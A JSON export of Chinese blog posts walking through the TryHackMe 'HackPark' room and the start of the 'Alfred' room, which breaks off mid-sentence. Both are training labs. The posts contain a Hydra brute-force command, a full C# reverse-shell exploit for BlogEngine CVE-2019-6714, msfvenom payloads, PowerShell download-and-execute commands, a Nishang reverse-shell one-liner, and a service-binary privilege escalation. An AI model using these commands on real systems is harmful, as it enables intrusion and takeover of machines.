[{"id":"b2262541e68f87fb5672c699c612b8ae","title":"HackPark CTF - TryHackMe.com","content":"HarkPark使用Hydra爆破登录网站，搜索漏洞，并利用漏洞升级Windows机器！\n信息收集开启tryhackme靶机，使用Nmap进行服务发现扫描。\n└─$ sudo nmap 10.10.1.135 -sS -Pn -F --max-retries 0 -T 4 -oA hackpark-port\nStarting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-31 09:29 EDT\nWarning: 10.10.1.135 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.1.135\nHost is up (0.45s latency).\nNot shown: 98 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n80&#x2F;tcp   open  http\n3389&#x2F;tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 4.48 seconds\n在扫描结果中，发现靶机开启了http服务，和远程桌面服务。我们首先在浏览器上查看Web服务。打开侧边选项，发现web服务支持登录。\nHydra暴力登录打开登录界面，我们需要借助Hydra的http-post-form模块对表单进行暴力登录。http-post-form: &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;],url后的部分分别代表了”登录表单页面路径”:”表单数据”:”失败的错误信息”。这些信息可以在浏览器的开发者工具(F12)中获取。\nhydra -l admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 10.10.1.135 http-post-form &#39;&#x2F;Account&#x2F;login.aspx: VIEWSTATE&#x3D;kn9SQDRdkNXCn%2F1dkTH%2BMRlN4nxR%2F%2F0OAPN9o2J209SAlfrRUqjn0t4C4kzBpc%2F6%2FqrKubzoR17Ky4ovCAITkWHvPvs00b%2FRKSLj%2FKeZNsHgmkMSfDCAWB%2FbYFIklj8Rto6L%2FN3b%2BqnN93Aa8ccovf5z8On2PnF7cNWlfG4YzqH46iMg&amp;__EVENTVALIDATION&#x3D;yefFfeBAZBXvixdER1v%2BX2605meAbWOF0webb4uj58dt5W0roYdxfZj09XAC%2BtFoUGAVswBCho4MHlF8N8vPWGCBjp38Q4JhYxTzzs2D1kQcr6ZuCZnsgvEZZmACtY2ju7159lb17aFy3GxJ2TX1qWuS3bcWBKzTX6KfYeLUK7rGX7Ka&amp;ctl00%24MainContent%24LoginUser%24UserName&#x3D;^USER^&amp;ctl00%24MainContent%24LoginUser%24Password&#x3D;^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton&#x3D;Log+in: Login failed&#39;\n\n# 使用^USER^ 和^PASS^对登录名和密码进行占位\n\n-l LOGIN: 指定登录名。\n-L File: 从指定文件中加载登录名\n-p PASS: 指定登录密码。\n-P File：从文件中加载登录密码爆破成功，登录名和密码分别为admin和1qaz2wsx。\n\n\nhydra http-post-form 用法\n└─$ hydra -U http-post-form\nHydra v9.2 (c) 2021 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2022-03-31 09:50:55\n\nHelp for module http-post-form:\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\nModule http-post-form requires the page and the parameters for the web form.\n\nBy default this module is configured to follow a maximum of 5 redirections in\na row. It always gathers a new cookie from the same URL without variables\nThe parameters take three &quot;:&quot; separated values, plus optional values.\n(Note: if you need a colon in the option string as value, escape it with &quot;\\:&quot;, but do not escape a &quot;\\&quot; with &quot;\\\\&quot;.)\n\nSyntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]\nFirst is the page on the server to GET or POST to (URL).\nSecond is the POST&#x2F;GET variables (taken from either the browser, proxy, etc.\n with url-encoded (resp. base64-encoded) usernames and passwords being replaced in the\n &quot;^USER^&quot; (resp. &quot;^USER64^&quot;) and &quot;^PASS^&quot; (resp. &quot;^PASS64^&quot;) placeholders (FORM PARAMETERS)\nThird is the string that it checks for an *invalid* login (by default)\n Invalid condition login check can be preceded by &quot;F&#x3D;&quot;, successful condition\n login check must be preceded by &quot;S&#x3D;&quot;.\n This is where most people get it wrong. You have to check the webapp what a\n failed string looks like and put it in this parameter!\nThe following parameters are optional:\n (c|C)&#x3D;&#x2F;page&#x2F;uri     to define a different page to gather initial cookies from\n (g|G)&#x3D;              skip pre-requests - only use this when no pre-cookies are required\n (h|H)&#x3D;My-Hdr\\: foo   to send a user defined HTTP header with each request\n                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!\n                 Note: &#39;h&#39; will add the user-defined header at the end\n                 regardless it&#39;s already being sent by Hydra or not.\n                 &#39;H&#39; will replace the value of that header if it exists, by the\n                 one supplied by the user, or add the header at the end\nNote that if you are going to put colons (:) in your headers you should escape them with a backslash (\\).\n All colons that are not option separators should be escaped (see the examples above and below).\n You can specify a header without escaping the colons, but that way you will not be able to put colons\n in the header value itself, as they will be interpreted by hydra as option separators.\n\nExamples:\n &quot;&#x2F;login.php:user&#x3D;^USER^&amp;pass&#x3D;^PASS^:incorrect&quot;\n &quot;&#x2F;login.php:user&#x3D;^USER64^&amp;pass&#x3D;^PASS64^&amp;colon&#x3D;colon\\:escape:S&#x3D;authlog&#x3D;.*success&quot;\n &quot;&#x2F;login.php:user&#x3D;^USER^&amp;pass&#x3D;^PASS^&amp;mid&#x3D;123:authlog&#x3D;.*failed&quot;\n &quot;&#x2F;:user&#x3D;^USER&amp;pass&#x3D;^PASS^:failed:H&#x3D;Authorization\\: Basic dT1w:H&#x3D;Cookie\\: sessid&#x3D;aaaa:h&#x3D;X-User\\: ^USER^:H&#x3D;User-Agent\\: wget&quot;\n &quot;&#x2F;exchweb&#x2F;bin&#x2F;auth&#x2F;owaauth.dll:destination&#x3D;http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags&#x3D;0&amp;username&#x3D;&lt;domain&gt;%5C^USER^&amp;password&#x3D;^PASS^&amp;SubmitCreds&#x3D;x&amp;trusted&#x3D;0:reason&#x3D;:C&#x3D;&#x2F;exchweb&quot;\n\n\n\n\n\n\n\n\n\n提示\nHydra 是一个并行化、快速和灵活的登录破解器。它默认在Kali linux上集成。\n\n漏洞攻击登录成功后，查看服务的about选项，发现了服务名称和版本号。在漏洞库查找该服务版本是否存在漏洞:也可以使用searchsploit查找漏洞:\n\n└─$ searchsploit blogengine\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                                                                                                                                        |  Path\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------\nBlogEngine 3.3 - &#39;syndication.axd&#39; XML External Entity Injection                                                                                                                                      | xml&#x2F;webapps&#x2F;48422.txt\nBlogEngine 3.3 - XML External Entity Injection                                                                                                                                                        | windows&#x2F;webapps&#x2F;46106.txt\nBlogEngine 3.3.8 - &#39;Content&#39; Stored XSS                                                                                                                                                               | aspx&#x2F;webapps&#x2F;48999.txt\nBlogEngine.NET 1.4 - &#39;search.aspx&#39; Cross-Site Scripting                                                                                                                                               | asp&#x2F;webapps&#x2F;32874.txt\nBlogEngine.NET 1.6 - Directory Traversal &#x2F; Information Disclosure                                                                                                                                     | asp&#x2F;webapps&#x2F;35168.txt\nBlogEngine.NET 3.3.6 - Directory Traversal &#x2F; Remote Code Execution                                                                                                                                    | aspx&#x2F;webapps&#x2F;46353.cs\nBlogEngine.NET 3.3.6&#x2F;3.3.7 - &#39;dirPath&#39; Directory Traversal &#x2F; Remote Code Execution                                                                                                                    | aspx&#x2F;webapps&#x2F;47010.py\nBlogEngine.NET 3.3.6&#x2F;3.3.7 - &#39;path&#39; Directory Traversal                                                                                                                                               | aspx&#x2F;webapps&#x2F;47035.py\nBlogEngine.NET 3.3.6&#x2F;3.3.7 - &#39;theme Cookie&#39; Directory Traversal &#x2F; Remote Code Execution                                                                                                               | aspx&#x2F;webapps&#x2F;47011.py\nBlogEngine.NET 3.3.6&#x2F;3.3.7 - XML External Entity Injection                                                                                                                                            | aspx&#x2F;webapps&#x2F;47014.py\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n我们选择可以执行远程代码的”BlogEngine.NET 3.3.6 - Directory Traversal &#x2F; Remote Code Execution”(CVE-2019-6714)漏洞，进行攻击。\n\nCVE-2019-6714 描述\n路径遍历漏洞，导致远程代码执行。这个漏洞影响BlogEngine。NET版本3.3.6及以下。这是由未选中的“theme”参数引起的，该参数用于覆盖呈现博客页面的默认主题。漏洞代码:/Custom/Controls/PostList.ascx.cs。\n漏洞攻击：\n\n首先，修改方法中TCP Client的地址和端口，建立一个反向TCP监听器等待连接。\n然后，上传修改好的文件(在BlogEngine3.3.6版本中，通过编辑文章功能，上传文件路径为http://10.10.1.135/admin/editor/editpost.cshtml)。文件名称必须为PostView.ascx,该文件会存在/App_Data/files下。\n最后，访问http://10.10.1.135/?theme-../../App_Data/files获取反向TCP连接。\n\n&lt;%@ Control Language=\"C#\" AutoEventWireup=\"true\" EnableViewState=\"false\" Inherits=\"BlogEngine.Core.Web.Controls.PostViewBase\" %>\n&lt;%@ Import Namespace=\"BlogEngine.Core\" %>\n\n&lt;script runat=\"server\">\n\tstatic System.IO.StreamWriter streamWriter;\n\n    protected override void OnLoad(EventArgs e) &#123;\n        base.OnLoad(e);\n\n\tusing(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(\"10.10.10.20\", 4445)) &#123;\n\t\tusing(System.IO.Stream stream = client.GetStream()) &#123;\n\t\t\tusing(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) &#123;\n\t\t\t\tstreamWriter = new System.IO.StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\tSystem.Diagnostics.Process p = new System.Diagnostics.Process();\n\t\t\t\tp.StartInfo.FileName = \"cmd.exe\";\n\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\tp.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\tp.Start();\n\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\twhile(true) &#123;\n\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t&#125;\n    \t&#125;\n    &#125;\n\n    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) &#123;\n   \tStringBuilder strOutput = new StringBuilder();\n\n       \tif (!String.IsNullOrEmpty(outLine.Data)) &#123;\n       \t\ttry &#123;\n                \tstrOutput.Append(outLine.Data);\n                    \tstreamWriter.WriteLine(strOutput);\n                    \tstreamWriter.Flush();\n                &#125; catch (Exception err) &#123; &#125;\n        &#125;\n    &#125;\n\n&lt;/script>\n&lt;asp:PlaceHolder ID=\"phContent\" runat=\"server\" EnableViewState=\"false\">&lt;/asp:PlaceHolder>\n上传修改好的攻击脚本，并上传到服务中。\n\n打开NetCat监听，并访问http://10.10.1.135/?theme-../../App_Data/files,获取反向TCP连接。\n└─$ rlwrap nc -lvnp 4445\nNcat: Version 7.92 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )\nNcat: Listening on :::4445\nNcat: Listening on 0.0.0.0:4445\nNcat: Connection from 10.10.1.135.\nNcat: Connection from 10.10.1.135:49353.\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\nc:\\windows\\system32\\inetsrv&gt;\n\nMetaSploit提权\n\n\n\n\n\n\n\n\n使用MetaSploit进行权限升级，首先需要获取Meterpreter会话，并使用它来获取靶机上潜在的漏洞。最终利用漏洞提升权限。\n切换至meterpreter会话使用msfvenom生成恶意程序,并开启http服务。\n└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp    LHOST&#x3D;10.4.63.84 LPORT&#x3D;5555 -f exe -o .&#x2F;reverse_5555.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: .&#x2F;reverse_5555.exe\n\n└─$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http:&#x2F;&#x2F;0.0.0.0:80&#x2F;) ...\n在netcat会话中将制作的恶意程序下载到靶机上。(需要将目录切换到有写权限的C:\\Windows\\Temp目录下)\nc:\\Windows\\Temp>powershell \"(New-Object System.Net.WebClient).Downloadfile('http://10.4.63.84/reverse_5555.exe','reverse_5555.exe')\"\n\nc:\\Windows\\Temp>\ndir\nc:\\Windows\\Temp>dir\n Volume in drive C has no label.\n Volume Serial Number is 0E97-C552\n Directory of c:\\Windows\\Temp\n03/31/2022  09:11 AM    &lt;DIR>          .\n03/31/2022  09:11 AM    &lt;DIR>          ..\n08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log\n08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log\n08/06/2019  02:13 PM             1,206 cleanup.txt\n08/06/2019  02:13 PM               421 cmdout\n08/06/2019  02:11 PM                 0 DMI2EBC.tmp\n08/03/2019  10:43 AM                 0 DMI4D21.tmp\n08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log\n08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log\n03/31/2022  09:11 AM    &lt;DIR>          Microsoft\n03/31/2022  09:11 AM            73,802 reverse_5555.exe\n08/06/2019  02:13 PM                21 stage1-complete.txt\n08/06/2019  02:13 PM            28,495 stage1.txt\n05/12/2019  09:03 PM           113,328 svcexec.exe\n08/06/2019  02:13 PM                67 tmp.dat\n              13 File(s)        708,784 bytes\n               3 Dir(s)  39,122,432,000 bytes free\n运行MetaSploit，开启exploit/multi/handler监听，等待获取meterpreter会话\nmsf6 &gt; use exploit&#x2F;multi&#x2F;handler\n[*] Using configured payload generic&#x2F;shell_reverse_tcp\nmsf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp\npayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp\nmsf6 exploit(multi&#x2F;handler) &gt; set LHOST 10.4.63.84\nLHOST &#x3D;&gt; 10.4.63.84\nmsf6 exploit(multi&#x2F;handler) &gt; set LPORT 5555\nLPORT &#x3D;&gt; 5555\nmsf6 exploit(multi&#x2F;handler) &gt; run\n\n[*] Started reverse TCP handler on 10.4.63.84:5555\n在netcat会话中运行powershell Start-Process &quot;shell-name.exe&quot;\nc:\\Windows\\Temp>\npowershell Start-Process \"reverse_5555.exe\"\nc:\\Windows\\Temp>powershell Start-Process \"reverse_5555.exe\"\n获得了meterpreter会话。\nmsf6 exploit(multi&#x2F;handler) &gt; run\n[*] Started reverse TCP handler on 10.4.63.84:5555\n[*] Sending stage (175174 bytes) to 10.10.1.135\n[*] Meterpreter session 1 opened (10.4.63.84:5555 -&gt; 10.10.1.135:49412 ) at 2022-03-31 12:22:07 -0400\n\nmeterpreter &gt; getuid\nServer username: IIS APPPOOL\\Blog\n提升系统权限在获得meterpreter会话后，就可以使用WinPEAS进一步的搜集靶机信息，寻找可能存在的漏洞。(使用powershll下载winPEASx64.exe到靶机)\nC:\\Windows\\Temp>powershell -c wget \"http://10.4.63.84/winPEASx64.exe\" -outfile \"winPEASx64.exe\"\nC:\\Windows\\Temp>dir\n Volume in drive C has no label.\n Volume Serial Number is 0E97-C552\n\n Directory of C:\\Windows\\Temp\n\n04/01/2022  09:34 AM    &lt;DIR>          .\n04/01/2022  09:34 AM    &lt;DIR>          ..\n08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log\n08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log\n08/06/2019  02:13 PM             1,206 cleanup.txt\n08/06/2019  02:13 PM               421 cmdout\n08/06/2019  02:11 PM                 0 DMI2EBC.tmp\n08/03/2019  10:43 AM                 0 DMI4D21.tmp\n08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log\n08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log\n04/01/2022  06:42 AM    &lt;DIR>          Microsoft\n04/01/2022  06:42 AM            73,802 reverse_5555.exe\n08/06/2019  02:13 PM                21 stage1-complete.txt\n08/06/2019  02:13 PM            28,495 stage1.txt\n05/12/2019  09:03 PM           113,328 svcexec.exe\n08/06/2019  02:13 PM                67 tmp.dat\n04/01/2022  09:34 AM         1,935,872 winPEASx64.exe\n              14 File(s)      2,644,656 bytes\n               3 Dir(s)  39,111,761,920 bytes free\n执行winPEASx64.exe quiet cmd serviceinfo。命令执行有非常多的输出，最终我们找到了Services Information模块的输出。\nC:\\Windows\\Temp>winPEASx64.exe quiet cmd serviceinfo\nwinPEASx64.exe quiet cmd serviceinfo\n......\n================================================Services Information================================================\n\n[+] Interesting Services -non Microsoft-\n [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services\n    Amazon EC2Launch(Amazon Web Services, Inc. - Amazon EC2Launch)[\"C:\\Program Files\\Amazon\\EC2Launch\\EC2Launch.exe\" service] - Auto - Stopped\n    Amazon EC2Launch\n   =================================================================================================\n\n    AmazonSSMAgent(Amazon SSM Agent)[\"C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe\"] - Auto - Running\n    Amazon SSM Agent\n   =================================================================================================\n\n    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe] - Auto - Running - No quotes and Space detected\n    AWS Lite Guest Agent\n   =================================================================================================\n\n    Ec2Config(Amazon Web Services, Inc. - Ec2Config)[\"C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe\"] - Auto - Running - isDotNet\n    Ec2 Configuration Service\n   =================================================================================================\n\n    PsShutdownSvc(Systems Internals - PsShutdown)[C:\\Windows\\PSSDNSVC.EXE] - Manual - Stopped\n   =================================================================================================\n\n    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\\PROGRA~2\\SYSTEM~1\\WService.exe] - Auto - Running\n    File Permissions: Everyone [WriteData/CreateFiles]\n    Possible DLL Hijacking in binary folder: C:\\Program Files (x86)\\SystemScheduler (Everyone [WriteData/CreateFiles])\n    System Scheduler Service Wrapper\n   =================================================================================================\n\n我们从输出中发现，C:\\Program Files (x86)\\SystemScheduler路径下的WindowsScheduler服务可能存在DLL劫持。同时我们也在exploit-db中搜索到了Splinterware System Scheduler Pro 5.12 - Privilege Escalation漏洞。\n\nSplinterware System Scheduler Pro 5.12\n由于不安全的文件权限而导致的权限提升,若要成功利用此漏洞，必须安装System Scheduler service服务。\n默认情况下，Everyone组对System Schedule服务路径下具有修改权限。一个低特权帐户可以重命名位于该服务路径下的执行文件，并上传一个恶意文件。因为System Scheduler service服务作为本地系统运行(nt authority\\system)，所以执行的恶意文件也将会获得系统权限。但是低特权帐户无法重启服务，所以更换的恶意文件必须与定期执行的服务文件同名，才能触发攻击。\nC:\\&gt;icacls &quot;c:\\Program Files (x86)\\SystemScheduler&quot;\nEveryone:(OI)(CI)(M)\nNT SERVICE\\TrustedInstaller:(I)(F)\nNT SERVICE\\TrustedInstaller:(I)(CI)(IO)(F)\nNT AUTHORITY\\SYSTEM:(I)(F)\nNT AUTHORITY\\SYSTEM:(I)(OI)(CI)(IO)(F)\nBUILTIN\\Administrators:(I)(F)\nBUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)\nBUILTIN\\Users:(I)(RX)\nBUILTIN\\Users:(I)(OI)(CI)(IO)(GR,GE)\nCREATOR OWNER:(I)(OI)(CI)(IO)(F)\nAPPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)\nAPPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)\n\n\n\n得知漏洞的具体使用信息后，我们继续深入调查靶机上所暴露的信息。查看winPEAS指向的SystemScheduler路径，发现了存在一个名为Events目录。在这个目录中我们找到了日志文件20198415519.INI_LOG.txt。\nmeterpreter &gt; cat 20198415519.INI_LOG.txt\n08&#x2F;04&#x2F;19 15:06:01,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:07:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:08:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:09:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:10:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)\n08&#x2F;04&#x2F;19 15:11:00,Event Started Ok, (Administrator)\n08&#x2F;04&#x2F;19 15:11:33,Process Ended. PID:468,ExitCode:4,Message.exe (Administrator)\n......\n在日志中Administrator每隔30s就会停止并重新执行一个名为Message.exe的可执行文件。结合上述漏洞的描述，Message.exe文件就是我们需要篡改的执行文件。使用msfvenom生成恶意程序。\n└─$ msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.4.63.84 LPORT&#x3D;1337 -f exe -o Message.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\nSaved as: Message.exe\n将靶机上的Message.exe重命名，并将生成的恶意程序上传到相同的路径下。\nC:\\Program Files (x86)\\SystemScheduler>rename Message.exe Message.old\nC:\\Program Files (x86)\\SystemScheduler>powershell Invoke-WebRequest -Uri http://10.4.63.84/Message.exe -Outfile Message.exe\nC:\\Program Files (x86)\\SystemScheduler>dir\n Directory of c:\\Program Files (x86)\\SystemScheduler\n04/01/2022  10:29 AM    &lt;DIR>          .\n04/01/2022  10:29 AM    &lt;DIR>          ..\n05/17/2007  01:47 PM             1,150 alarmclock.ico\n08/31/2003  12:06 PM               766 clock.ico\n08/31/2003  12:06 PM            80,856 ding.wav\n04/01/2022  10:27 AM    &lt;DIR>          Events\n08/04/2019  04:36 AM                60 Forum.url\n01/08/2009  08:21 PM         1,637,972 libeay32.dll\n11/16/2004  12:16 AM             9,813 License.txt\n04/01/2022  06:32 AM             1,496 LogFile.txt\n04/01/2022  06:32 AM             3,760 LogfileAdvanced.txt\n04/01/2022  10:29 AM             7,168 Message.exe\n03/25/2018  10:58 AM           536,992 Message.old\n.....\n稍等片刻后，netcat获得管理员权限。\n└─$ rlwrap nc -lvnp 1337\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::1337\nNcat: Listening on 0.0.0.0:1337\nNcat: Connection from 10.10.200.41.\nNcat: Connection from 10.10.200.41:49469.\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\nC:\\>whoami\nhackpark\\administrator\n\n\n\nWindows-Exploit-Suggester寻找漏洞\n该工具将目标补丁级别与 Microsoft 漏洞数据库进行比较，以检测目标上可能丢失的补丁。它还通知用户是否有公共利用和 Metasploit 模块可用于缺失的公告。它需要 Windows 主机的 systeminfo 命令输出，以便比较 Microsoft 安全公告数据库并确定主机的补丁级别。\nmeterpreter &gt; sysinfo\nComputer        : HACKPARK\nOS              : Windows 2012 R2 (6.3 Build 9600).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86&#x2F;windows\n\n运行sysinfo获取系统信息后，在这里我们借助开源工具Windows-Exploit-Suggester来快速查找当前版本系统可能利用的漏洞信息。(使用Python2运行该脚本)\n\n└─$ python2 windows-exploit-suggester.py --database 2022-03-31-mssb.xls --ostext &#39;Windows 2012 R2&#39;\n...\n...\n[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important\n[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;40107&#x2F; -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF\n[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39574&#x2F; -- Microsoft Windows 8.1&#x2F;10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC\n[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39719&#x2F; -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32&#x2F;x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC\n[*]   https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;39809&#x2F; -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32&#x2F;x64) - Local Privilege Escalation (MS16-032) (C#)\n···\n...\n\n\n\n使用工具\n\n\n\n\n\n\n\n\n\nNamp\nMetaSploit\nhydra\nmsfvenom\nwinPEAS\n\n参考文档\n\n\n\n\n\n\n\n\n\nWindows-Exploit-Suggester\nIntroducing Windows Exploit Suggester\nProject Zero\n\n","slug":"HackPark","date":"2022-03-28T14:30:27.813Z","categories_index":"CTF","tags_index":"tryhackme,Windows Privilege Escalation","author_index":"剑三"},{"id":"9bc1ecabb820de0d2d4c4b58e6a30fdc","title":"Alfred CTF - TryHackMe.com","content":"在Alfred靶机上，我们利用Jenkins常见的错误配置信息，进行攻击提权。\n获取信息开启靶机，获取靶机IP。我们直接使用nmap进行扫描，确认服务端口。扫描结果中的两个端口均为web服务(80,8080),从浏览器打开进行查看。我们的攻击重点就在Jenkins服务上，Jenkins默认初始化会存在admin用户。在暴力破解密码前，我们可以尝试密码猜测，当输入admin:admin时，直接登录成功。点击项目project，选择configure选项编辑项目，可以利用Bulid步骤下的Execute Windows batch command组件在靶机上执行脚本命令。我们需要将下载好的Invoke-PowerShellTcp.ps1托管在Http服务上，同时开启Ncat监听。并将下面的代码要放在Jenkins中执行，获取反shell会话。\npowershell iex (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;&lt;yourwebserver&gt;&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]\n执行成功后，获得反Shell会话。\n\n\n\n\n\n\nNishang\nNishang 是一个框架和脚本和有效负载的集合，它支持使用 PowerShell 进行攻击性安全、渗透测试和红队。Nishang 在渗透测试的所有阶段都很有用。\n\n切换Shell为了提升权限更简单，我们需要将当前获取的shell会话切换到meterprter shell。1.使用msfvenom制作恶意程序,并托管在http服务器上\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -a x86 --encoder x86&#x2F;shikata_ga_nai LHOST&#x3D;[IP] LPORT&#x3D;[PORT] -f exe -o [SHELL NAME].exe\n\n-p: 选择一个payload\n-a: 指定系统架构\n--encoder: 指定编码器，此处使用的x86&#x2F;shikata_ga_nai编码器\n-f: 生成的文件格式\n-o: 生成路径和文件名\n\n\n2.使用jenkins将恶意程序上传至靶机\npowershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt;&#x2F;shell-name.exe&#39;,&#39;shell-name.exe&#39;)&quot;\n3.运行MetaSploit，开启exploit/multi/handler监听，等待获取meterpreter会话\nuse exploit&#x2F;multi&#x2F;handler set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp set LHOST your-ip set LPORT listening-port run\n4.在之前获取的会话中运行powershell Start-Process &quot;shell-name.exe&quot;5.执行完成后，msfconsole获取meterpreter会话。后续的提权操作都会在meterpreter会话中进行。\n权限提升Windows使用访问令牌(Access Tokens)来确保帐户具有执行特定操作的正确权限。当用户登录或通过身份验证时，帐户令牌会分配给帐户。这通常由Local Security Authority Subsystem 